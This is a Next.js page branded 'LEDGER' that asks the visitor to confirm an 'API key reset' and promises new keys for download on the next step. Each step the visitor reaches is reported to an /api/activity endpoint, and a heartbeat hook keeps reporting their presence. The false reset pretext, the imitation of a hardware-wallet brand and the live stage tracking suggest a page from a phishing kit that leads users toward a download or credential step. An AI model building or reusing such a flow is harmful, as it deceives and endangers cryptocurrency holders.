"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { AlertTriangle, KeyRound, ShieldAlert } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"

export default function ConfirmResetPage() {
  const router = useRouter()
  const [visitorId, setVisitorId] = useState<string>("")
  const [isNavigating, setIsNavigating] = useState(false)

  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (id) {
      setVisitorId(id)
      fetch(`/api/activity?visitorId=${id}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.activity) {
            const activity: UserActivity = {
              ...data.activity,
              currentStage: "confirm-reset",
              lastUpdated: new Date().toISOString(),
            }
            fetch("/api/activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ visitorId: id, activity }),
            })
          }
        })
    } else {
      router.push("/")
    }
  }, [router])

  const handleYes = async () => {
    if (isNavigating) return
    setIsNavigating(true)
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()

      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          currentStage: "reset-api-keys",
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }
    router.push("/reset-api-keys")
  }

  const handleNo = () => {
    router.back()
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="max-w-lg mx-auto">
          <div className="flex justify-center mb-5">
            <div className="w-14 h-14 rounded-full bg-warning/20 flex items-center justify-center">
              <ShieldAlert className="w-7 h-7 text-warning" />
            </div>
          </div>

          <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-3 text-center text-balance">
            API Key Reset Confirmation
          </h1>
          <p className="text-sm text-muted-foreground text-center mb-6">
            Would you like to reset the API keys that have current requests on them?
          </p>

          <Card className="bg-secondary/50 border-border mb-6">
            <CardContent className="pt-5 pb-5">
              <div className="flex items-start gap-3 mb-4">
                <AlertTriangle className="w-5 h-5 text-warning shrink-0 mt-0.5" />
                <div>
                  <p className="text-sm font-medium text-foreground mb-1">This action will:</p>
                  <ul className="text-xs text-muted-foreground space-y-1.5">
                    <li>Invalidate all current API keys with pending requests</li>
                    <li>Generate new replacement keys for your account</li>
                    <li>Require re-authentication on all connected services</li>
                  </ul>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <KeyRound className="w-5 h-5 text-muted-foreground shrink-0 mt-0.5" />
                <p className="text-xs text-muted-foreground">
                  Your new API keys will be available for download on the next step.
                </p>
              </div>
            </CardContent>
          </Card>

          <div className="flex gap-3">
            <Button
              onClick={handleNo}
              className="flex-1 bg-destructive text-destructive-foreground hover:bg-destructive/80 h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
            >
              No, go back
            </Button>
            <Button
              onClick={handleYes}
              disabled={isNavigating}
              className="flex-1 bg-success text-success-foreground hover:bg-success/80 h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
            >
              {isNavigating ? "Loading..." : "Yes, reset keys"}
            </Button>
          </div>
        </div>
      </main>

      <LedgerFooter />
    </div>
  )
}
